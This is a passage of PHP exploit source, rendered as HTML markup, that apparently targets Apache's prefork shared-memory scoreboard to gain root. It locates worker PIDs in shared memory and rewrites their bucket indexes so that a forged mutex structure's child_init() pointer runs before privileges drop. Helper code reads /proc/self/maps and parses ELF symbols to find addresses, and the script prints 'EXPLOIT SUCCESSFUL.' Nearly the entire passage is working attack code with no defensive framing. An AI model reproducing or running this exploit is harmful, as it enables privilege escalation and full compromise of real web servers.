class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# process_score structure. We can then change process_score.bucket to</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# the index we computed. When apache reboots, it will use</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# all_buckets[ap_scoreboard_image-&gt;parent[i]-&gt;bucket]-&gt;mutex</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# which means we control the whole apr_proc_mutex_t structure.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# This structure contains pointers to multiple functions, especially</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# mutex-&gt;meth-&gt;child_init(), which will be called before privileges</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# are dropped.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# We do this for every worker PID, incrementing the bucket index so that</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# we cover a bigger range.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39;Iterating in SHM to find PIDs...&#39;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Number of bucket indexes covered by our spray</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$spray_nb_buckets = (int) ($spray_size / $size_prefork_child_bucket);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Number of bucket indexes covered by our spray and the PS structures</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$total_nb_buckets = $spray_nb_buckets * count($workers_pids);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# First bucket index to handle</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$bucket_index = $bucket_index_middle - (int) ($total_nb_buckets / 2);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Iterate over every process_score structure until we find every PID or</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# we reach the end of the SHM</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$p = $addresses[&#39;shm&#39;][0] + 0x20;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$p &lt; $addresses[&#39;shm&#39;][1] &amp;&amp; count($workers_pids) &gt; 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$p += 0x24</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$l = $p - $address;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$current_pid = str2ptr($this-&gt;abc, $l, 4);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39;Got PID: &#39; . $current_pid);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# The PID matches one of the workers</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(in_array($current_pid, $workers_pids))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unset($workers_pids[$current_pid]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39; &nbsp;PID matches&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Update bucket address</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$s_bucket_index = pack(&#39;l&#39;, $bucket_index);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;abc[$l + 0x20] = $s_bucket_index[0];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;abc[$l + 0x21] = $s_bucket_index[1];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;abc[$l + 0x22] = $s_bucket_index[2];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;abc[$l + 0x23] = $s_bucket_index[3];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39; &nbsp;Changed bucket value to &#39; . $bucket_index);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$min = $spray_min - $size_prefork_child_bucket * $bucket_index;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$max = $spray_max - $size_prefork_child_bucket * $bucket_index;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39; &nbsp;Ranges: 0x&#39; . dechex($min) . &#39; - 0x&#39; . dechex($max));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# This bucket range is covered, go to the next one</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$bucket_index += $spray_nb_buckets;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(count($workers_pids) &gt; 0)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Unable to find PIDs &#39; .</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;implode(&#39;, &#39;, $workers_pids) .</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39; in SHM, exiting.&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39;&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39;EXPLOIT SUCCESSFUL.&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o(&#39;Await 6:25AM.&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function o($msg)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# No concatenation -&gt; no string allocation</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print($msg);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;\n&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function ptr2str($ptr, $m=8)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$out = &quot;&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for ($i=0; $i&lt;$m; $i++)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$out .= chr($ptr &amp; 0xff);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ptr &gt;&gt;= 8;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return $out;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function str2ptr(&amp;$str, $p, $s=8)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$address = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for($j=$s-1;$j&gt;=0;$j--)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$address &lt;&lt;= 8;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$address |= ord($str[$p+$j]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return $address;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function in($i, $range)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return $i &gt;= $range[0] &amp;&amp; $i &lt; $range[1];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">/**</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> * Finds the offset of a symbol in a file.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> */</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function find_symbol($file, $symbol)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$elf = file_get_contents($file);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$e_shoff = str2ptr($elf, 0x28);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$e_shentsize = str2ptr($elf, 0x3a, 2);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$e_shnum = str2ptr($elf, 0x3c, 2);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$dynsym_off = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$dynsym_sz = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$dynstr_off = 0;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for($i=0;$i&lt;$e_shnum;$i++)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$offset = $e_shoff + $i * $e_shentsize;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$sh_type = str2ptr($elf, $offset + 0x04, 4);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$SHT_DYNSYM = 11;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$SHT_SYMTAB = 2;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$SHT_STRTAB = 3;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;switch($sh_type)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case $SHT_DYNSYM:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$dynsym_off = str2ptr($elf, $offset + 0x18, 8);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$dynsym_sz = str2ptr($elf, $offset + 0x20, 8);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case $SHT_STRTAB:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case $SHT_SYMTAB:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!$dynstr_off)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$dynstr_off = str2ptr($elf, $offset + 0x18, 8);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(!($dynsym_off &amp;&amp; $dynsym_sz &amp;&amp; $dynstr_off))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(&#39;.&#39;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$sizeof_Elf64_Sym = 0x18;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for($i=0;$i * $sizeof_Elf64_Sym &lt; $dynsym_sz;$i++)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$offset = $dynsym_off + $i * $sizeof_Elf64_Sym;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$st_name = str2ptr($elf, $offset, 4);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!$st_name)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$offset_string = $dynstr_off + $st_name;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$end = strpos($elf, &quot;\x00&quot;, $offset_string) - $offset_string;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$string = substr($elf, $offset_string, $end);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($string == $symbol)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$st_value = str2ptr($elf, $offset + 0x8, 8);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return $st_value;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;die(&#39;Unable to find symbol &#39; . $symbol);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Obtains the addresses of the shared memory block and some functions through </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># /proc/self/maps</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># This is hacky as hell.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function get_all_addresses()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$addresses = [];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$data = file_get_contents(&#39;/proc/self/maps&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$follows_shm = false;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;foreach(explode(&quot;\n&quot;, $data) as $line)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!isset($addresses[&#39;shm&#39;]) &amp;&amp; strpos($line, &#39;/dev/zero&#39;))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$line = explode(&#39; &#39;, $line)[0];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$bounds = array_map(&#39;hexdec&#39;, explode(&#39;-&#39;, $line));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$msize = $bounds[1] - $bounds[0];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($msize &gt;= 0x10000 &amp;&amp; $msize &lt;= 0x16000)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$addresses[&#39;shm&#39;] = $bounds;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$follows_shm = true;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;preg_match(&#39;#(/[^\s]+libc-[0-9.]+.so[^\s]*)#&#39;, $line, $matches) &amp;&amp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strpos($line, &#39;r-xp&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 